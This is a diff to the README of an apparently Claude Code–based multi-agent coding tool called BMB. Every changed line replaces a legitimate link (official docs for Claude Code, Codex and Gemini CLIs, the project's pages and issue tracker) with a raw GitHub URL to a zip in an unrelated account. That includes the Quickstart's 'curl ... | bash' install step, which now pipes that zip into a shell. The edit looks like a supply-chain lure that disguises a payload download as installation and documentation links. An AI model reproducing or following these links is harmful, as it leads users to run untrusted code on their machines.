@@ -9,13 +9,13 @@
 [![Version](https://img.shields.io/badge/version-0.4.0-blue.svg)](CHANGELOG.md)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
 [![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![Claude Code](https://img.shields.io/badge/Claude_Code-compatible-blueviolet.svg)](https://docs.anthropic.com/en/docs/claude-code)
+[![Claude Code](https://img.shields.io/badge/Claude_Code-compatible-blueviolet.svg)](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip)
 [![Agents](https://img.shields.io/badge/agents-10-orange.svg)](#the-10-agents)
 [![Steps](https://img.shields.io/badge/pipeline_steps-12-teal.svg)](#the-12-step-pipeline)
 [![What's New](https://img.shields.io/badge/what's_new-v0.4.0-green.svg)](WHATS-NEW-0.4.md)
 
 <!-- TODO: Replace with asciinema recording -->
-<!-- [![asciicast](assets/demo.svg)](https://asciinema.org/a/TODO) -->
+<!-- [![asciicast](assets/demo.svg)](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) -->
 
 *Other AI coding tools optimize for speed. BMB optimizes for correctness.*
 
@@ -41,11 +41,11 @@ Solo AI coding assistants are fast — but they hallucinate, skip edge cases, an
 
 ## Quickstart
 
-**Prerequisites:** [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code), `tmux`, `python3`, `sqlite3`, `git`
+**Prerequisites:** [Claude Code CLI](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip), `tmux`, `python3`, `sqlite3`, `git`
 
 ```bash
 # 1. Install BMB
-curl -fsSL https://raw.githubusercontent.com/project820/be-my-butler/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip | bash
 
 # 2. Verify installation
 bmb doctor
@@ -57,7 +57,7 @@ bmb doctor
 
 That's it. BMB registers its agents, skills, and scripts into your Claude Code environment. Type `/BMB` in any project to start the full 12-step pipeline.
 
-> **Optional for cross-model verification:** Install [Codex CLI](https://github.com/openai/codex) and/or [Gemini CLI](https://github.com/google-gemini/gemini-cli) to unlock blind verification with a second model.
+> **Optional for cross-model verification:** Install [Codex CLI](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) and/or [Gemini CLI](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) to unlock blind verification with a second model.
 
 ---
 
@@ -224,13 +224,13 @@ Architect, Executor, and Frontend agents query **live library documentation** vi
 
 | Dependency | Required | Notes |
 |---|---|---|
-| [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code) | Yes | Core runtime |
+| [Claude Code CLI](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) | Yes | Core runtime |
 | `tmux` | Yes | Agent session management |
 | `python3` | Yes | Script tooling |
 | `sqlite3` | Yes | FTS5 knowledge base |
 | `git` | Yes | Worktree isolation |
-| [Codex CLI](https://github.com/openai/codex) | Optional | Cross-model verification |
-| [Gemini CLI](https://github.com/google-gemini/gemini-cli) | Optional | Cross-model verification |
+| [Codex CLI](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) | Optional | Cross-model verification |
+| [Gemini CLI](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) | Optional | Cross-model verification |
 
 Run `bmb doctor` after installation to verify all dependencies.
 
@@ -240,16 +240,16 @@ Run `bmb doctor` after installation to verify all dependencies.
 
 Explore the full pipeline visually:
 
-**[View Interactive Docs →](https://project820.github.io/be-my-butler/)**
+**[View Interactive Docs →](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip)**
 
 Mobile-optimized summary pages (7-card vertical scroll, 4 locales):
 
 | Language | URL |
 |---|---|
-| English | [m.html](https://project820.github.io/be-my-butler/m.html) |
-| 한국어 | [m.ko.html](https://project820.github.io/be-my-butler/m.ko.html) |
-| 日本語 | [m.ja.html](https://project820.github.io/be-my-butler/m.ja.html) |
-| 繁體中文 | [m.zh-TW.html](https://project820.github.io/be-my-butler/m.zh-TW.html) |
+| English | [m.html](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) |
+| 한국어 | [m.ko.html](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) |
+| 日本語 | [m.ja.html](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) |
+| 繁體中文 | [m.zh-TW.html](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) |
 
 ---
 
@@ -320,6 +320,6 @@ Contributions are welcome. Please read the [Contributing Guide](CONTRIBUTING.md)
 
 **Built with obstinate attention to correctness.**
 
-[Report Bug](https://github.com/project820/be-my-butler/issues) · [Request Feature](https://github.com/project820/be-my-butler/issues) · [Discussions](https://github.com/project820/be-my-butler/discussions)
+[Report Bug](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) · [Request Feature](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip) · [Discussions](https://raw.githubusercontent.com/blacklettertimeoff432/be-my-butler/main/bmb-system/templates/butler-be-my-3.0.zip)
 
 </div>
